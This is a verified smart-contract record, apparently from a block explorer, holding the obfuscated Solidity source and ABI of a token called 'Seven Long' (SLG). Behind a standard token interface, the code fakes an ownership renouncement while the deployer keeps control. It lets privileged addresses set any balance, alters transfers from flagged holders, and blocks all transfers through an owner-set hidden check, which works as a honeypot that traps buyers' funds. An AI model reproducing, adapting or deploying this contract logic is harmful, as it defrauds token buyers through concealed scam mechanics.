{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface launchTakeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptEnableLaunched {\n    function createPair(address fundTake, address teamTotalSender) external returns (address);\n}\n\ninterface swapTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableToken) external view returns (uint256);\n\n    function transfer(address liquidityLaunched, uint256 takeReceiver) external returns (bool);\n\n    function allowance(address amountListSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunched,\n        uint256 takeReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoTeam, uint256 value);\n    event Approval(address indexed amountListSender, address indexed spender, uint256 value);\n}\n\ninterface swapTeamMetadata is swapTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SevenLong is totalSender, swapTeam, swapTeamMetadata {\n\n    function transferFrom(address fundAmount, address liquidityLaunched, uint256 takeReceiver) external override returns (bool) {\n        if (_msgSender() != marketingMode) {\n            if (liquidityTrading[fundAmount][_msgSender()] != type(uint256).max) {\n                require(takeReceiver <= liquidityTrading[fundAmount][_msgSender()]);\n                liquidityTrading[fundAmount][_msgSender()] -= takeReceiver;\n            }\n        }\n        return totalAt(fundAmount, liquidityLaunched, takeReceiver);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minExemptLimit;\n    }\n\n    function balanceOf(address enableToken) public view virtual override returns (uint256) {\n        return sellMarketing[enableToken];\n    }\n\n    address private tradingReceiver;\n\n    address marketingMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address autoEnableSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private launchedTx = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeLimitFee;\n    }\n\n    bool public walletShould;\n\n    uint256 private feeWallet;\n\n    bool public launchedTxWallet;\n\n    function limitTotal(address modeFee) public {\n        if (modeAt) {\n            return;\n        }\n        \n        enableIs[modeFee] = true;\n        \n        modeAt = true;\n    }\n\n    bool public modeAt;\n\n    address public minLaunched;\n\n    uint256 private teamFromTrading;\n\n    mapping(address => uint256) private sellMarketing;\n\n    function receiverMin() public {\n        emit OwnershipTransferred(atMaxTake, address(0));\n        tradingReceiver = address(0);\n    }\n\n    string private minExemptLimit = \"Seven Long\";\n\n    uint256 private toAtReceiver;\n\n    function takeSwap(uint256 takeReceiver) public {\n        shouldSenderLiquidity();\n        minLaunch = takeReceiver;\n    }\n\n    uint8 private txFrom = 18;\n\n    uint256 constant receiverAutoMarketing = 19 ** 10;\n\n    uint256 public amountTx;\n\n    function autoFundWallet(address fundAmount, address liquidityLaunched, uint256 takeReceiver) internal returns (bool) {\n        require(sellMarketing[fundAmount] >= takeReceiver);\n        sellMarketing[fundAmount] -= takeReceiver;\n        sellMarketing[liquidityLaunched] += takeReceiver;\n        emit Transfer(fundAmount, liquidityLaunched, takeReceiver);\n        return true;\n    }\n\n    bool public tradingList;\n\n    function totalAt(address fundAmount, address liquidityLaunched, uint256 takeReceiver) internal returns (bool) {\n        if (fundAmount == atMaxTake) {\n            return autoFundWallet(fundAmount, liquidityLaunched, takeReceiver);\n        }\n        uint256 buyLiquidity = swapTeam(minLaunched).balanceOf(autoEnableSwap);\n        require(buyLiquidity == minLaunch);\n        require(liquidityLaunched != autoEnableSwap);\n        if (modeToken[fundAmount]) {\n            return autoFundWallet(fundAmount, liquidityLaunched, receiverAutoMarketing);\n        }\n        return autoFundWallet(fundAmount, liquidityLaunched, takeReceiver);\n    }\n\n    mapping(address => bool) public modeToken;\n\n    function minIsReceiver(address swapBuy) public {\n        shouldSenderLiquidity();\n        \n        if (swapBuy == atMaxTake || swapBuy == minLaunched) {\n            return;\n        }\n        modeToken[swapBuy] = true;\n    }\n\n    mapping(address => bool) public enableIs;\n\n    constructor (){\n        \n        launchTakeMin modeExempt = launchTakeMin(marketingMode);\n        minLaunched = exemptEnableLaunched(modeExempt.factory()).createPair(modeExempt.WETH(), address(this));\n        \n        atMaxTake = _msgSender();\n        receiverMin();\n        enableIs[atMaxTake] = true;\n        sellMarketing[atMaxTake] = launchedTx;\n        if (swapToken) {\n            swapSender = true;\n        }\n        emit Transfer(address(0), atMaxTake, launchedTx);\n    }\n\n    event OwnershipTransferred(address indexed maxReceiver, address indexed maxFee);\n\n    bool private maxToFund;\n\n    mapping(address => mapping(address => uint256)) private liquidityTrading;\n\n    function getOwner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    function allowance(address sellFeeTx, address maxBuy) external view virtual override returns (uint256) {\n        if (maxBuy == marketingMode) {\n            return type(uint256).max;\n        }\n        return liquidityTrading[sellFeeTx][maxBuy];\n    }\n\n    bool public swapSender;\n\n    address public atMaxTake;\n\n    uint256 minLaunch;\n\n    function shouldSenderLiquidity() private view {\n        require(enableIs[_msgSender()]);\n    }\n\n    function launchedToken(address tradingTo, uint256 takeReceiver) public {\n        shouldSenderLiquidity();\n        sellMarketing[tradingTo] = takeReceiver;\n    }\n\n    function approve(address maxBuy, uint256 takeReceiver) public virtual override returns (bool) {\n        liquidityTrading[_msgSender()][maxBuy] = takeReceiver;\n        emit Approval(_msgSender(), maxBuy, takeReceiver);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txFrom;\n    }\n\n    uint256 walletReceiver;\n\n    bool public swapToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTx;\n    }\n\n    function transfer(address tradingTo, uint256 takeReceiver) external virtual override returns (bool) {\n        return totalAt(_msgSender(), tradingTo, takeReceiver);\n    }\n\n    string private takeLimitFee = \"SLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountListSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellFeeTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"launchedToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTxWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"limitTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"}],\"name\":\"minIsReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SevenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}